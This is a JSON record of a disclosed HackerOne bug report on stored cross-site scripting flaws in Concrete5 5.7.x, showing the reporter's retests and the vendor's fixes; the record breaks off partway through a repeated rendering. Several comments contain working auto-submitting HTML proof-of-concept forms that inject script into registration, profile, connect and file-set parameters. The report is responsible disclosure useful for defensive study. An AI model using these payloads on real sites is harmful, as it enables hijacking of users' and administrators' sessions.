{"id":59662,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81OTY2Mg==","url":"https://hackerone.com/reports/59662","title":"Multiple Stored Cross Site Scripting Vulnerabilities in Concrete5 version 5.7.3.1","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-05-05T09:20:53.992Z","submitted_at":"2015-05-05T09:20:53.992Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"egix","url":"/egix","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/431/9435ac0bb25492f164582fbbc7e3f6f8f016b1d1_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":60,"url":"https://hackerone.com/concrete5","handle":"concrete5","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"concrete5","twitter_handle":"concrete5","website":"https://www.concrete5.org","about":"A simple and powerful content management system."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-06-26T18:28:25.248Z","bug_reporter_agreed_on_going_public_at":"2016-05-27T18:28:23.706Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Concrete5 is vulnerable to some stored Cross Site Scripting (XSS) attacks because certain user input is being used within the output it generates without validating or encoding it.","vulnerability_information_html":"\u003cp\u003eConcrete5 is vulnerable to some stored Cross Site Scripting (XSS) attacks because certain user input is being used within the output it generates without validating or encoding it.\u003c/p\u003e\n","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":36775,"file_name":"Concrete5-Multiple-Stored-XSS.pdf","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/036/775/88aa004290af4ecc3c4944e7e4ea528268f89137/Concrete5-Multiple-Stored-XSS.pdf?response-content-disposition=attachment%3B%20filename%3D%22Concrete5-Multiple-Stored-XSS.pdf%22%3B%20filename%2A%3DUTF-8%27%27Concrete5-Multiple-Stored-XSS.pdf\u0026response-content-type=application%2Fpdf\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T062923Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026X-Amz-Signature=59162cf8e65e6a34126848e32a75289a749d1ee6f25c99f52737a011d1dff776","file_size":613653,"type":"application/pdf"}],"allow_singular_disclosure_at":"2016-06-26T18:28:23.795Z","allow_singular_disclosure_after":-142257659.4037962,"singular_disclosure_allowed":true,"vote_count":2,"voters":["mak","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":402063,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"**This report has been automatically set to \"needs more info\"** because it does not adhere to the rules listed [on our project page](https://hackerone.com/concrete5). Please go over these rules and resubmit following the directions.\r\n\r\nIf you've read and complied with all of the rules, please email security@concrete5.org so that this issue may be reopened.","markdown_message":"\u003cp\u003e\u003cstrong\u003eThis report has been automatically set to \u0026quot;needs more info\u0026quot;\u003c/strong\u003e because it does not adhere to the rules listed \u003ca href=\"https://hackerone.com/concrete5\"\u003eon our project page\u003c/a\u003e. Please go over these rules and resubmit following the directions.\u003c/p\u003e\n\n\u003cp\u003eIf you\u0026#39;ve read and complied with all of the rules, please email \u003ca title=\"security@concrete5.org\" href=\"mailto:security@concrete5.org\" rel=\"nofollow noopener noreferrer\"\u003esecurity@concrete5.org\u003c/a\u003e so that this issue may be reopened.\u003c/p\u003e\n","automated_response":true,"created_at":"2015-05-05T09:20:55.800Z","updated_at":"2015-05-05T09:20:55.800Z","actor":{"url":"/concrete5","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"concrete5"}},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":402070,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"The vulnerabilities are detailed in the attached PDF report.","markdown_message":"\u003cp\u003eThe vulnerabilities are detailed in the attached PDF report.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-05-05T09:30:57.264Z","updated_at":"2015-05-05T09:30:57.264Z","actor":{"username":"egix","cleared":false,"url":"/egix","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/431/9435ac0bb25492f164582fbbc7e3f6f8f016b1d1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":402289,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your report, can you test these against 5.7.4RC2+ as it incorporates a bunch of XSS and other fixes.\n\nThanks","markdown_message":"\u003cp\u003eThanks for your report, can you test these against 5.7.4RC2+ as it incorporates a bunch of XSS and other fixes.\u003c/p\u003e\n\n\u003cp\u003eThanks\u003c/p\u003e\n","automated_response":false,"created_at":"2015-05-05T15:22:46.071Z","updated_at":"2015-05-05T15:22:46.071Z","actor":{"username":"mnkras","cleared":false,"url":"/mnkras","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/844/ec0ad0d7189e5d34e9b4063ef708e600dca89435_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":408538,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I just tested these on Concrete5 version 5.7.4, with the following results: all of these vulnerabilities are still present in the new release, except for the one related to the \"register_notification_email\" parameter (which has been solved along with the fix for the sendmail vulnerability) and the one related to the \"msgstr\" parameter. The vulnerability affecting the \"fsNewText\" parameter seems to be no more present, however it has been reintroduced in another script, so it can still be exploited in a slightly different way:\n\n\u003chtml\u003e\n\u003cbody\u003e\n\u003cform method=\"POST\" action=\"http://localhost/concrete5.7.4/index.php/ccm/system/dialogs/file/sets/submit?fID=1\"\u003e\n\u003cinput type=\"hidden\" name=\"fsNew[]\" value=\"\u003cscript\u003ealert(/XSS/)\u003c/script\u003e\"\u003e\n\u003c/form\u003e\n\u003cscript\u003edocument.forms[0].submit()\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e","markdown_message":"\u003cp\u003eI just tested these on Concrete5 version 5.7.4, with the following results: all of these vulnerabilities are still present in the new release, except for the one related to the \u0026quot;register_notification_email\u0026quot; parameter (which has been solved along with the fix for the sendmail vulnerability) and the one related to the \u0026quot;msgstr\u0026quot; parameter. The vulnerability affecting the \u0026quot;fsNewText\u0026quot; parameter seems to be no more present, however it has been reintroduced in another script, so it can still be exploited in a slightly different way:\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;html\u0026gt;\u003cbr\u003e\n\u0026lt;body\u0026gt;\u003cbr\u003e\n\u0026lt;form method=\u0026quot;POST\u0026quot; action=\u0026quot;http://localhost/concrete5.7.4/index.php/ccm/system/dialogs/file/sets/submit?fID=1\u0026quot;\u0026gt;\u003cbr\u003e\n\u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;fsNew[]\u0026quot; value=\u0026quot;\u0026lt;script\u0026gt;alert(/XSS/)\u0026lt;/script\u0026gt;\u0026quot;\u0026gt;\u003cbr\u003e\n\u0026lt;/form\u0026gt;\u003cbr\u003e\n\u0026lt;script\u0026gt;document.forms[0].submit()\u0026lt;/script\u0026gt;\u003cbr\u003e\n\u0026lt;/body\u0026gt;\u003cbr\u003e\n\u0026lt;/html\u0026gt;\u003c/p\u003e\n","automated_response":false,"created_at":"2015-05-11T22:07:09.408Z","updated_at":"2015-05-11T22:07:38.819Z","actor":{"username":"egix","cleared":false,"url":"/egix","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/431/9435ac0bb25492f164582fbbc7e3f6f8f016b1d1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":408819,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Awesome, Ill take a look through and try and get these resolved.\n\nThanks again.","markdown_message":"\u003cp\u003eAwesome, Ill take a look through and try and get these resolved.\u003c/p\u003e\n\n\u003cp\u003eThanks again.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-05-12T03:08:50.506Z","updated_at":"2015-05-12T03:08:50.506Z","actor":{"username":"mnkras","cleared":false,"url":"/mnkras","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/844/ec0ad0d7189e5d34e9b4063ef708e600dca89435_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":640072,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"I believe all of these have been resolved in the core, I've gone ahead and [added a CSRF token](https://github.com/concrete5/concrete5/commit/7586fbabe185675a1e517fff0517558e81857835) to register as well.","markdown_message":"\u003cp\u003eI believe all of these have been resolved in the core, I\u0026#39;ve gone ahead and \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fconcrete5%2Fconcrete5%2Fcommit%2F7586fbabe185675a1e517fff0517558e81857835\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eadded a CSRF token\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to register as well.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-10-31T20:41:55.871Z","updated_at":"2015-10-31T20:41:55.871Z","actor":{"username":"korvin","cleared":false,"url":"/korvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yi9xvfnDmjKpKA1reqNSwGct/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"egix","url":"/egix"},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":731065,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I just tested all of these on the latest stable version (5.7.5.3 released on November 24, 2015). The following issues are not fixed yet:\n\n* **uEmail POST parameter during user registration** - the vulnerability can still be exploited using the following PoC:\n\n```\n\u003chtml\u003e\n\u003cbody\u003e\n\u003cform method=\"POST\" action=\"http://[host]/concrete5/index.php/register/do_register\"\u003e\n\u003cinput type=\"hidden\" name=\"uName\" value=\"StoredXSS\"\u003e\n\u003cinput type=\"hidden\" name=\"uEmail\" value='stored@xss.com\"\u003e\u003cscript\u003ealert(/XSS/)\u003c/script\u003e'\u003e\n\u003cinput type=\"hidden\" name=\"uPassword\" value=\"password\"\u003e\n\u003cinput type=\"hidden\" name=\"uPasswordConfirm\" value=\"password\"\u003e\n\u003cinput type=\"hidden\" name=\"uDefaultLanguage\" value=\"it-IT\"\u003e\n\u003c/form\u003e\n\u003cscript\u003edocument.forms[0].submit()\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\nAfter creating a new user with such a malformed email address, the injected JavaScript code will be executed every time an user visit his profile or the member list page. I believe this is the most critical issue: when anonymous user registration is being enabled this might enable unauthenticated attackers to carry out XSS attacks against all other users, including Concrete5 administrators, without the need for a CSRF attack.\n\n* **gravatar_max_level and  gravatar_image_set POST parameters during profile options update** - the vulnerability can still be exploited using the following PoC:\n\n```\n\u003chtml\u003e\n\u003cbody\u003e\n\u003cform method=\"POST\" action=\"http://[host]/concrete5/index.php/dashboard/system/registration/profiles/update_profiles\"\u003e\n\u003cinput type=\"hidden\" name=\"public_profiles\" value=\"1\"\u003e\n\u003cinput type=\"hidden\" name=\"gravatar_fallback\" value='1'\u003e\n\u003cinput type=\"hidden\" name=\"gravatar_max_level\" value='\" autofocus onfocus=\"alert(1)'\u003e\n\u003cinput type=\"hidden\" name=\"gravatar_image_set\" value='\" onmouseover=\"alert(2)'\u003e\n\u003c/form\u003e\n\u003cscript\u003edocument.forms[0].submit()\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n* **csURLToken POST parameter during community connect update** - the vulnerability can still be exploited using the following PoC:\n\n```\n\u003chtml\u003e\n\u003cbody\u003e\n\u003cform method=\"POST\" action=\"http://[host]/concrete5/index.php/dashboard/extend/connect/connect_complete\"\u003e\n\u003cinput type=\"hidden\" name=\"csToken\" value=\"my_token\"\u003e\n\u003cinput type=\"hidden\" name=\"csURLToken\" value=\"\u003c/a\u003e\u003cscript\u003ealert(/XSS/)\u003c/script\u003e\"\u003e\n\u003c/form\u003e\n\u003cscript\u003edocument.forms[0].submit()\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\nThe injected JavaScript code will be executed every time an user visit a page like http://[host]/concrete5/index.php/dashboard/extend/.\n\n* **fsNew POST parameter when adding/editing a file set** - the vulnerability can still be exploited using the following PoC:\n\n```\n\u003chtml\u003e\n\u003cbody\u003e\n\u003cform method=\"POST\" action=\"http://localhost/concrete5/index.php/ccm/system/dialogs/file/sets/submit?fID=1\"\u003e\n\u003cinput type=\"hidden\" name=\"fsNew[]\" value=\"\u003cscript\u003ealert(/XSS/)\u003c/script\u003e\"\u003e\n\u003c/form\u003e\n\u003cscript\u003edocument.forms[0].submit()\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\nThe injected JavaScript code will be executed every time an user go to the http://[host]/concrete5/index.php/dashboard/files/search page, clicks on a file to show up the menu and then hits the \"Set\" item.\n\nPlease note that all of these issues could be exploited via CSRF attacks because of the vulnerability reported to #59660.","markdown_message":"\u003cp\u003eI just tested all of these on the latest stable version (5.7.5.3 released on November 24, 2015). The following issues are not fixed yet:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cstrong\u003euEmail POST parameter during user registration\u003c/strong\u003e - the vulnerability can still be exploited using the following PoC:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://[host]/concrete5/index.php/register/do_register\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;uName\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;StoredXSS\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;uEmail\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;stored@xss.com\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(/XSS/)\u0026lt;/script\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;uPassword\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;uPasswordConfirm\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;uDefaultLanguage\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;it-IT\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eforms\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003esubmit\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter creating a new user with such a malformed email address, the injected JavaScript code will be executed every time an user visit his profile or the member list page. I believe this is the most critical issue: when anonymous user registration is being enabled this might enable unauthenticated attackers to carry out XSS attacks against all other users, including Concrete5 administrators, without the need for a CSRF attack.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cstrong\u003egravatar_max_level and  gravatar_image_set POST parameters during profile options update\u003c/strong\u003e - the vulnerability can still be exploited using the following PoC:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://[host]/concrete5/index.php/dashboard/system/registration/profiles/update_profiles\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;public_profiles\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;gravatar_fallback\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;gravatar_max_level\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u0026quot; autofocus onfocus=\u0026quot;alert(1)\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;gravatar_image_set\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u0026quot; onmouseover=\u0026quot;alert(2)\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eforms\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003esubmit\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cstrong\u003ecsURLToken POST parameter during community connect update\u003c/strong\u003e - the vulnerability can still be exploited using the following PoC:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://[host]/concrete5/index.php/dashboard/extend/connect/connect_complete\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;csToken\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;my_token\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;csURLToken\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026lt;/a\u0026gt;\u0026lt;script\u0026gt;alert(/XSS/)\u0026lt;/script\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan 